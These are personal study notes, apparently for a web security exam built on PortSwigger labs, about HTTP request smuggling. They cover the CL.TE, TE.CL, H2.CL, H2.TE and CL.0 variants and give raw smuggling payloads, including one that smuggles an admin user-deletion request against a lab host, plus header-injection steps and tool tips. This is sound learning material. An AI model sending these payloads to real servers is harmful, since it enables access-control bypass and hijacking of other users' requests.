## 🎯 Overview

HTTP Request Smuggling exploits discrepancies in how front-end and back-end servers parse HTTP requests.

## 🔍 Types

### CL.TE (Content-Length → Transfer-Encoding)
- Front-end uses `Content-Length`
- Back-end uses `Transfer-Encoding`

### TE.CL (Transfer-Encoding → Content-Length)
- Front-end uses `Transfer-Encoding`
- Back-end uses `Content-Length`

## 🔥 Detection Payloads

### CL.TE Detection
```http
POST / HTTP/1.1
Host: vulnerable-site.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 49
Transfer-Encoding: chunked

e
q=smuggling&x=
0

GET /404 HTTP/1.1
X: X
```

### TE.CL Detection
```http
POST / HTTP/1.1
Host: vulnerable-site.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

5c
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0


```

### H2.CL Detection

The following request would fail.

```http
POST / HTTP/2
Host: 0aed00f803364fb78037f3cd007400bb.web-security-academy.net
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: cross-site
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Sec-Ch-Ua: "Not;A=Brand";v="8", "Chromium";v="150"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Referer: https://portswigger.net/
Accept-Encoding: gzip, deflate, br
Priority: u=0, i
Content-Type: application/x-www-form-urlencoded
Content-Length: 0


aaaa
```

### H2.TE Detection

It is required to modify the request header via the inspector. The result can not be interpreted as standard http1, so it can't be created manually and can not be seen as a normal request.

At the requests headers on the inspector, add a new header. Set any value to it, then, as value, set any value, then `SHIFT+ENTER` to add `\r\n` and finally `Transfer-Encoding: chunked`. This value is ignored by HTTP/2 but valid for HTTP/1, so the breakline will create a new header for HTTP/1 allowing to inject TE that would be stripped by the front.

![[Pasted image 20260829220159.png]]
It is also feasable to inject the sumgged request in the header. The same method just that we are not adding a headder, we are adding a line break and a new request afterwards.

![[Pasted image 20260829220146.png]]
### CL.0

Front cares about Content Length, but backend ignores it, i.e. assume 0.

Often happens with: 
- Server side redirects
- Static Files
- Server errors

Must be on the same connection: Connection keep-alive.

Can be abused to trigger a request from an internal host if the front prevents it. 

IN A GROUP WITH SINGLE CONNECTION
```http
POST /resources/images/blog.svg HTTP/1.1
Host: 0afc005104ba330883a09da9003e0090.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 53
Connection: Keep-Alive

GET /admin/delete?username=carlos HTTP/1.1
X-Ignore:
```
# Exploit 

## Notes

- It is best to paste the victim request in the body of the smuggled to prevent the victim request headers to mess up with the smuggled req.

## 🛠️ Tools

### HTTP Request Smuggler (Burp Extension)
**Essential tool for detecting and exploiting request smuggling**

**Usage:**
1. Install from BApp Store
2. Right-click request → Extensions → HTTP Request Smuggler → Smuggle probe
3. Review results for CL.TE, TE.CL, or TE.TE vulnerabilities

## 🎓 Exam Tips

1. **Use HTTP Request Smuggler extension** - Automates detection
2. **Check feedback forms** - Common location for smuggling
3. **Try GPOST method** - Easy detection technique
4. **Be patient** - Smuggling requires precise timing

